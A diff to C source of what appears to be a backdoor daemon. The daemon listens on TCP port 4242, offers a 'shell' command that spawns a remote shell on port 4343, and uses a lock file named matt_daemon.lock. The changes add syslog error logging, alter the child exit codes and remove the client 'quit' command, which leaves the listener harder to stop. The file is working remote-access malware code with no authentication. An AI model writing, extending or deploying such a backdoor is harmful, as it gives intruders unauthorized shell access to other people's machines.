@@ -1,5 +1,6 @@
 #include "../includes/durex.h"
 #include <syslog.h>
+#include <errno.h>
 
 fd_set readset, writeset;
 int max_connections = 0;
@@ -93,17 +94,21 @@ int		ft_create_serveur(t_daemon *daemon)
 	p = getprotobyname("tcp");
 	if (p == 0)
 	{
+		syslog(1, "%s", "error on get protobyname");
 		ft_exit(daemon, -1);
 	}
 	sock = socket(AF_INET6, SOCK_STREAM, p->p_proto);
 	if (setsockopt(daemon->sock, SOL_SOCKET, SO_REUSEADDR, &toto, sizeof(int)) < 0)
 	{
+		syslog(1, "%s", "error on setsocket options");
 		ft_exit(daemon, -1);
 	}
 	sin.sin6_family = AF_INET6;
 	sin.sin6_port = htons(4242);
 	sin.sin6_addr = in6addr_any;
 	if (bind(sock, (const struct sockaddr*)&sin, sizeof(sin)) == -1){
+
+		syslog(1, "%s + %s", "error on bind ", strerror(errno));
 		ft_exit(daemon, -1);
 	}
 	listen(sock, 3);
@@ -164,25 +169,17 @@ void	handle_connection(t_daemon *daemon, int cs)
 		FD_CLR(cs, &readset);
 		FD_CLR(cs, &writeset);
 		max_connections--;
-		syslog(1, "%s", "fewf");
+		syslog(1, "%s", "closing connection");
 		close(cs);
 		return ;
 	}
 	mem->data[mem->len - 1] = '\0';
-	if (ft_strequ(mem->data, "quit") == 1)
-	{
-		FD_CLR(cs, &readset);
-		FD_CLR(cs, &writeset);
-		close(cs);
-		ft_exit(daemon, -1);
-	}
 	if (ft_strequ(mem->data, "?") == 1)
 		write(cs, "?     show help\nshell spawn remote shell on 4343\n", ft_strlen("?     show help\nshell spawn remote shell on 4343\n"));
 	if (ft_strequ(mem->data, "shell") == 1)
 		spawn_shell(cs);
 	write(cs, "$> ", 3);
 	ft_free_mem(mem);
-	
 }
 
 void	open_lock(t_daemon *daemon)
@@ -190,8 +187,10 @@ void	open_lock(t_daemon *daemon)
 	daemon->lock_file = open("/var/lock/matt_daemon.lock", O_CREAT | O_EXCL);
 	if (daemon->lock_file == -1)
 	{
+		syslog(1, "%s", "file locked");
 		exit(-1);
 	}
+	syslog(1, "%s", "locking file");
 	flock(daemon->lock_file, LOCK_EX);
 }
 
@@ -234,9 +233,10 @@ int	main(void)
 				memcpy(&writeset, &readset, sizeof(writeset));
 				if (select(maxfd + 1, &writeset, NULL, NULL, NULL) < 0)
 				{
-					perror("select");
+					syslog(1, "%s", "error on select");
 					ft_exit(daemon, -1);
-				}else
+				}
+				else
 				{
 					for (i = 0; i <= maxfd; i++)
 					{
@@ -270,14 +270,14 @@ int	main(void)
 		}
 		else
 		{
-			syslog(1, "%s", "find de fokr 2");
-			exit(-1);
+			syslog(1, "%s", "closing second child");
+			exit(0);
 		}
 	}
 	else
 	{
-		syslog(1, "%s", "find de fokr 1");
-		exit(-1);
+		syslog(1, "%s", "closing first child");
+		exit(0);
 	}
 		
 	return (0);
